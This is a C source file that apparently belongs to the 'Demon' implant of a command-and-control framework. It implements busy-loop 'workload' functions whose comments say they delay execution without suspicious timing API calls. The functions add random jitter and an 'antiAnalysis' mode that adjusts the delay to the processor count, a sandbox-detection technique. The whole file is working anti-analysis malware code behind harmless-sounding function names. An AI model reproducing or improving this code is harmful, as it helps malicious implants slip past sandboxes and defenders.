#include <Demon.h>

// =============================================================================
// PROCESS WORKLOAD - PURE COMPUTATIONAL PROCESSING
// =============================================================================
// Provides computational workload processing without any timing APIs
// Delay execution without suspicious API calls
// =============================================================================

/**
 * Pure computational delay - NO TIMING APIS WHATSOEVER
 * @param delayMs - approximate delay (based on typical system performance)
 */
VOID ProcessWorkloadDelay(DWORD delayMs) {
    if (delayMs == 0) return;
    
    // Calculate iterations based on empirical testing across various systems
    // Typical modern CPU: ~50,000 iterations per millisecond
    ULONGLONG iterations = (ULONGLONG)delayMs * 50000;
    
    // Minimum iterations to prevent zero-delay
    if (iterations < 1000) iterations = 1000;
    
    // Volatile variables to prevent compiler optimization
    volatile ULONGLONG counter = 0;
    volatile ULONGLONG dummy = 0;
    volatile DWORD hashResult = 0;
    
    // Pure computational workload - NO APIS
    for (ULONGLONG i = 0; i < iterations; i++) {
        // Layer 1: Simple arithmetic operations
        counter += (i * 7) + (i / 3);
        dummy = counter ^ (i << 2);
        
        // Layer 2: Hash computation every 1000 iterations
        if (i % 1000 == 0) {
            hashResult = HashEx((PVOID)&counter, sizeof(counter), TRUE);
            dummy += hashResult;
        }
        
        // Layer 3: Memory access pattern (every 10000 iterations)
        if (i % 10000 == 0 && iterations > 10000) {
            volatile BYTE tempBuffer[64];
            for (int j = 0; j < 64; j++) {
                tempBuffer[j] = (BYTE)(dummy + j);
            }
            counter += tempBuffer[i % 64];
        }
        
        // Layer 4: Random number generation (every 5000 iterations)
        if (i % 5000 == 0 && iterations > 5000) {
            ULONG seed = (ULONG)(counter & 0xFFFFFFFF);
            Instance->Win32.RtlRandomEx(&seed);
            dummy += seed;
        }
        
        // Prevent dead code elimination
        if (dummy == 0xDCCE33DD) {
            break; // Will never happen, but prevents optimization
        }
    }
    
    // Final computation to use all variables
    hashResult = HashEx((PVOID)&dummy, sizeof(dummy), FALSE);
}

/**
 * Advanced workload processor with random variance
 * @param baseDelayMs - base delay in MILLISECONDS
 * @param variance - percentage variance (0-100)
 */
VOID ProcessWorkloadDelayEx(DWORD baseDelayMs, DWORD variance) {
    if (baseDelayMs == 0) return;
    
    DWORD actualDelay = baseDelayMs;
    
    if (variance > 0 && variance <= 100) {
        // Calculate random variance
        ULONG seed = RandomNumber32();
        DWORD varianceAmount = (baseDelayMs * variance) / 100;
        DWORD randomVariance = Instance->Win32.RtlRandomEx(&seed) % (varianceAmount * 2);
        
        // Apply variance (can be positive or negative)
        if (randomVariance > varianceAmount) {
            actualDelay += (randomVariance - varianceAmount);
        } else {
            actualDelay = (actualDelay > randomVariance) ? 
                          (actualDelay - randomVariance) : 10; // Minimum 10ms
        }
    }
    
    ProcessWorkloadDelay(actualDelay);
}

/**
 * Adaptive workload processor - pure computational approach
 * @param targetSeconds - approximate seconds of processing time
 */
VOID ProcessAdaptiveWorkload(DWORD targetSeconds) {
    // Simple approach - just convert seconds to milliseconds
    // No timing APIs needed - pure computational workload
    DWORD targetMs = targetSeconds * 1000;
    
    // Add some variance to make it less predictable
    ULONG seed = RandomNumber32();
    DWORD variance = Instance->Win32.RtlRandomEx(&seed) % 200; // 0-200ms variance
    targetMs += variance;
    
    ProcessWorkloadDelay(targetMs);
}

/**
 * Advanced workload processor with environment adaptation
 * @param delayValue - processing workload value
 * @param antiAnalysis - enable environment adaptation features
 */
VOID ProcessWorkloadAdvanced(DWORD delayValue, BOOL antiAnalysis) {
    if (antiAnalysis) {
        // Check CPU count for environment adaptation (using legitimate API)
        SYSTEM_INFO sysInfo;
        Instance->Win32.GetSystemInfo(&sysInfo);
        
        // Adapt workload based on CPU count
        if (sysInfo.dwNumberOfProcessors == 1) {
            delayValue /= 2; // Reduce workload on single CPU systems
        } else if (sysInfo.dwNumberOfProcessors > 8) {
            delayValue += (delayValue / 4); // Increase workload on high-core systems
        }
    }
    
    ProcessWorkloadDelayEx(delayValue, 25); // 25% jitter
}
